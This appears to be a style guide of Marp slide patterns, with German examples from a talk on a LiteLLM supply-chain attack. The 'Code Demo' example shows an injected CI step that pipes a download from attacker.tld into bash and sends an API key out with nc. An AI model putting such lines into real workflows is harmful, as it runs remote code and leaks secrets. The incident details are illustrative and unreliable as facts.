# Slide Patterns

Seven archetypes. Pick the one that fits the content; combine across the deck for rhythm. Write headings in the deck language, German by default (German examples below mirror the reference deck; switch to English / other only if the user explicitly asked for that language).

Slide separator: `---` on its own line, with a blank line above and below.

---

## 1. Title / Lead

**Use when:** opening slide, occasional act-break before a major shift.

```markdown
<!-- _class: lead -->

# Supply Chain Nightmare

*Wie ein einziger geleakter Token zur Kompromittierung von LiteLLM führte*
```

Notes: `<!-- _class: lead -->` centers the slide via `section.lead`. Subtitle is one plain paragraph, under ~80 chars.

---

## 2. Definition

**Use when:** introducing a concept, framework, or term that needs grounding before mechanics.

```markdown
# Was ist LiteLLM?

> Ein Open-Source Proxy, der über 100 LLM-APIs hinter einer einheitlichen OpenAI-kompatiblen Schnittstelle bündelt.

- **Zweck:** Zentrale Verwaltung von Modell-Routing, Rate-Limits und Quotas
- **Reichweite:** ~20.000 Stars auf GitHub, Production-Deployments bei Großkunden
- **Speichert:** API-Keys, Nutzungs-Logs, manchmal Prompt-Inhalte
```

Notes: H1 is the concept. The `>` callout holds the one-sentence definition (it renders as a box, not a quote). 3–5 bullets with `**bold key**` per line.

---

## 3. Matrix / Chain

**Use when:** comparing phases, attack stages, version/release timelines, or several parallel things.

```markdown
# Die Angriffskette: 1 Breach, 3 parallele Angriffe

| Stufe | Ziel | Methode | Wirkung |
|---|---|---|---|
| **1** | `Trivy` (Aqua) | CI-Token Leak | Einstieg |
| **2** | `LiteLLM` | PR mit Backdoor | Code-Execution |
| **3** | `BerriAI` infra | Stolen secrets | Cred-Pivot |
| **4** | Endkunden | Modell-Hijack | Daten-Exfil |
```

Notes: ≤ 4 columns, ≤ 6 rows, cells left-aligned. Cells with `**bold**` for emphasis, inline `` `code` `` for identifiers (they never wrap, so keep them short). Cell text ≤ ~45 chars.

---

## 4. Code-and-List

**Use when:** technical explanation that mixes a code identifier (CVE, package, command, file path) with bullet detail. Most-used pattern.

```markdown
# Stufe 1: Trivy – Der Einstiegspunkt

## Aqua's Open-Source Scanner

`trivy v0.55.0` — CVE-Scanner mit weitreichenden CI-Permissions.

- Geleakter `GITHUB_TOKEN` aus einer öffentlichen Action-Run
- Token mit `write:packages` und `repo`-Scope
- Angreifer pushte über `aquasecurity/trivy@malicious-tag`
- Kein 2FA-Enforcement auf dem CI-Service-Account
```

Notes: Optional `## Sub-label` (one line, theme H2 color). Lead paragraph with inline `code`. 3–5 bullets, each with one identifier in `code`.

---

## 5. Code Demo

**Use when:** showing the actual exploit, payload, or command sequence. Minimal prose.

```markdown
# Demo: Die schadhafte Pull Request

```python
# .github/workflows/release.yml — eingeschleust
- name: Build
  run: |
    curl -sL https://attacker.tld/x | bash
    echo "$LITELLM_MASTER_KEY" | nc attacker.tld 4444
```

> Nur 4 Zeilen. Code-Review hat es durchgewunken.
```

Notes: Single fenced block ≤ 14 lines and ≤ 70 chars per line. Always include the language tag. Optional one-line `>` callout underneath as commentary.

---

## 6. Closing Impact

**Use when:** final slide before sources, or a punchline section break. One sentence, big visual weight.

```markdown
<!-- _class: lead -->

# Ein geleaktes CI-Token.

**Vier Tage später:** Tausende API-Keys exfiltriert.
```

Notes: `<!-- _class: lead -->` again. One H1 + one short paragraph with `**emphasis**`. Optional Marp background image: `![bg right](path/to/image.jpg)` — leave as `TODO` placeholder if no image is available.

---

## 7. Sources

**Use when:** last slide. Always include this — every claim should be traceable.

```markdown
# Quellen

- [Aqua Security advisory](https://www.aquasec.com/news/...)
- [LiteLLM postmortem](https://github.com/BerriAI/litellm/...)
- [`CVE-2025-XXXXX` (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2025-XXXXX)
- [Socket.dev analysis](https://socket.dev/...)
- [BleepingComputer coverage](https://www.bleepingcomputer.com/...)
```

Notes: Title is "Quellen" (de) / "Sources" (en) / "References" (en formal). Inline `code` for identifiers (CVE IDs, package names). Plain markdown links — no footnote-style numbering.

---

## Translation table for section headings

| de | en |
|---|---|
| Quellen | Sources |
| Auswirkungen | Impact |
| Lessons Learned | Lessons Learned |
| Was ist X? | What is X? |
| Demo | Demo |
| Zusammenfassung | Summary |
| Hintergrund | Background |
| Zeitachse | Timeline |
| Mitigationen | Mitigations |
